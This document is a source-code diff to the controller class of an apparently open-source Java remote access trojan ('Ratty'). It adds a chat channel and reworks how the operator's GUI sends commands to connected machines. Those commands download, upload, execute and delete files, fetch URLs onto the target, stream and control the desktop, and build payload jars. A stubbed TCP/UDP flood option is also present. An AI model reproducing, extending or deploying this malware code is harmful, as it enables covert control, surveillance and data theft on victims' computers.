@@ -20,6 +20,7 @@ import de.sogomn.engine.util.Scheduler.Task;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.JarBuilder;
 import de.sogomn.rat.packet.AudioPacket;
+import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
 import de.sogomn.rat.packet.CreateDirectoryPacket;
@@ -47,7 +48,8 @@ import de.sogomn.rat.util.FrameEncoder.IFrame;
  */
 public final class RattyGuiController extends AbstractRattyController implements IGuiController {
 	
-	private RattyGui gui;
+	private ActiveServer server;
+	private IRattyGui gui;
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
@@ -55,7 +57,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private Scheduler scheduler;
 	private Task pingTask;
 	
-	private static final String BUILDER_REPLACEMENT = "connection_data.txt";
+	private static final String BUILDER_REPLACEMENT = "connection_data";
 	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
 	private static final String[] BUILDER_REMOVALS = {
 		"ping.wav",
@@ -93,31 +95,32 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
-	public RattyGuiController() {
-		gui = new RattyGui();
-		clients = new HashMap<ActiveConnection, ServerClient>();
-		clock = new Clock();
-		scheduler = new Scheduler();
-		pingTask = new Task(() -> {
+	public RattyGuiController(final ActiveServer server, final IRattyGui gui) {
+		this.server = server;
+		this.gui = gui;
+		
+		final Runnable task = () -> {
 			final PingPacket packet = new PingPacket();
 			
 			connections.forEach(connection -> connection.addPacket(packet));
-			
 			pingTask.reset();
-		}, PING_INTERVAL);
-		
+		};
 		final Thread pingThread = new Thread(() -> {
 			while (true) {
 				clock.update();
 			}
 		});
 		
+		clients = new HashMap<ActiveConnection, ServerClient>();
+		clock = new Clock();
+		scheduler = new Scheduler();
+		pingTask = new Task(task, PING_INTERVAL);
+		
 		pingThread.setDaemon(true);
 		pingThread.start();
 		
 		scheduler.addTask(pingTask);
 		clock.addListener(scheduler);
-		gui.addListener(this);
 	}
 	
 	/*
@@ -179,7 +182,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getClickedNode();
+		final FileTreeNode node = client.fileTree.getNodeClicked();
 		final String path = node.getPath();
 		final DownloadFilePacket packet = new DownloadFilePacket(path);
 		
@@ -190,7 +193,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final File file = gui.getFile();
 		
 		if (file != null) {
-			final FileTreeNode node = client.fileTree.getClickedNode();
+			final FileTreeNode node = client.fileTree.getNodeClicked();
 			final String path = node.getPath();
 			final UploadFilePacket packet = new UploadFilePacket(file, path);
 			
@@ -201,7 +204,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getClickedNode();
+		final FileTreeNode node = client.fileTree.getNodeClicked();
 		final String path = node.getPath();
 		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
 		
@@ -209,7 +212,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DeleteFilePacket createDeletePacket(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getClickedNode();
+		final FileTreeNode node = client.fileTree.getNodeClicked();
 		final String path = node.getPath();
 		final DeleteFilePacket packet = new DeleteFilePacket(path);
 		
@@ -220,7 +223,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String input = gui.getInput();
 		
 		if (input != null) {
-			final FileTreeNode node = client.fileTree.getClickedNode();
+			final FileTreeNode node = client.fileTree.getNodeClicked();
 			final String path = node.getPath();
 			final CreateDirectoryPacket packet = new CreateDirectoryPacket(path, input);
 			
@@ -246,7 +249,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String address = gui.getInput(URL_MESSAGE);
 		
 		if (address != null) {
-			final FileTreeNode node = client.fileTree.getClickedNode();
+			final FileTreeNode node = client.fileTree.getNodeClicked();
 			final String path = node.getPath();
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
 			
@@ -280,6 +283,13 @@ public final class RattyGuiController extends AbstractRattyController implements
 		return null;
 	}
 	
+	private ChatPacket createChatPacket(final ServerClient client) {
+		final String message = client.chat.getMessage();
+		final ChatPacket packet = new ChatPacket(message);
+		
+		return packet;
+	}
+	
 	private void toggleDesktopStream(final ServerClient client) {
 		final boolean streamingDesktop = client.isStreamingDesktop();
 		
@@ -300,7 +310,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void requestFile(final ServerClient client) {
-		final FileTreeNode node = client.fileTree.getClickedNode();
+		final FileTreeNode node = client.fileTree.getNodeClicked();
 		final String path = node.getPath();
 		final FileRequestPacket packet = new FileRequestPacket(path);
 		
@@ -342,13 +352,17 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void launchAttack() {
-		final int input = gui.showOptionDialog(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, OPTION_CANCEL);
+		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, OPTION_CANCEL);
+		
+		//AttackPacket packet = null;
 		
 		if (input == JOptionPane.YES_OPTION) {
 			//TCP flood packet
 		} else if (input == JOptionPane.NO_OPTION) {
 			//UDP flood packet
 		}
+		
+		//broadcast(packet);
 	}
 	
 	private void handleCommand(final ServerClient client, final String command) {
@@ -366,6 +380,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 			startBuilder();
 		} else if (command == FileTree.REQUEST) {
 			requestFile(client);
+		} else if (command == RattyGui.CHAT) {
+			client.chat.setVisible(true);
+		} else if (command == RattyGui.CLOSE) {
+			server.close();
 		}
 	}
 	
@@ -404,6 +422,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createUploadExecutePacket(client);
 		} else if (command == RattyGui.DROP_EXECUTE) {
 			packet = createDropExecutePacket(client);
+		} else if (command == ChatWindow.MESSAGE_SENT) {
+			packet = createChatPacket(client);
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
@@ -471,8 +491,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final long milliseconds = packet.getMilliseconds();
 		
 		client.setPing(milliseconds);
-		
 		gui.update();
+	}
+	
+	private void handleChatPacket(final ServerClient client, final ChatPacket packet) {
+		final String message = packet.getMessage();
+		final String name = client.getName();
+		
+		client.chat.addLine(name + ": " + message);
 	}
 	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
@@ -504,6 +530,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final PingPacket ping = (PingPacket)packet;
 			
 			handlePing(client, ping);
+		} else if (clazz == ChatPacket.class) {
+			final ChatPacket chat = (ChatPacket)packet;
+			
+			handleChatPacket(client, chat);
 		} else if (clazz == FreePacket.class) {
 			//To prevent shutdown
 		} else {
@@ -545,7 +575,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.logIn(name, os, version, icon);
 		client.addListener(this);
 		
-		gui.addRow(client);
+		gui.addClient(client);
 		notification.trigger();
 		PING.play();
 	}
@@ -581,26 +611,27 @@ public final class RattyGuiController extends AbstractRattyController implements
 	public void disconnected(final ActiveConnection connection) {
 		final ServerClient client = getClient(connection);
 		
-		gui.removeRow(client);
+		super.disconnected(connection);
+		
+		gui.removeClient(client);
+		clients.remove(connection);
 		
 		client.removeListener(this);
 		client.setStreamingDesktop(false);
 		client.setStreamingVoice(false);
-		
-		clients.remove(connection);
-		
-		super.disconnected(connection);
+		client.logOut();
 	}
 	
 	@Override
 	public void closed(final ActiveServer server) {
-		gui.removeAllListeners();
-		
 		super.closed(server);
+		
+		clients.values().forEach(ServerClient::logOut);
 	}
 	
 	@Override
-	public void userInput(final String command, final ServerClient client) {
+	public void userInput(final String command, final Object source) {
+		final ServerClient client = (ServerClient)source;
 		final IPacket packet = createPacket(client, command);
 		
 		if (packet != null) {
